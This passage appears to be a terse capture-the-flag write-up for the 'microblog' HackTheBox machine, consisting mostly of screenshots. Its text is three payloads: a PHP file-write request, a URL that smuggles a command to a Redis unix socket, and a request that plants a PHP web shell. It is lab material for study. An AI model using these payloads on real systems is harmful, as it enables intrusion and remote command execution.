...
![image-center](/assets/images/Pasted image 20260218153222.png)

![image-center](/assets/images/Pasted image 20260218153932.png)

![image-center](/assets/images/Pasted image 20260218153256.png)

![image-center](/assets/images/Pasted image 20260218153325.png)

![image-center](/assets/images/Pasted image 20260218153338.png)

![image-center](/assets/images/Pasted image 20260218153432.png)

![image-center](/assets/images/Pasted image 20260218153509.png)

![image-center](/assets/images/Pasted image 20260218153519.png)
...
![image-center](/assets/images/Pasted image 20260218155537.png)


![image-center](/assets/images/Pasted image 20260218155506.png)

```bash
id=/var/www/microblog/test/content/bad.php&header=<?php print_r("cmd");?>
```

![image-center](/assets/images/Pasted image 20260218161236.png)

```bash
http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:%20zsln%20pro%20true%0atest
```

![image-center](/assets/images/Pasted image 20260218163043.png)

![image-center](/assets/images/Pasted image 20260218162936.png)

![image-center](/assets/images/Pasted image 20260218163403.png)

```bash
id=/var/www/microblog/test/uploads/shell.php&header=<?php+system($_GET[0]);?>
```

![image-center](/assets/images/Pasted image 20260218164044.png)

![image-center](/assets/images/Pasted image 20260218164035.png)
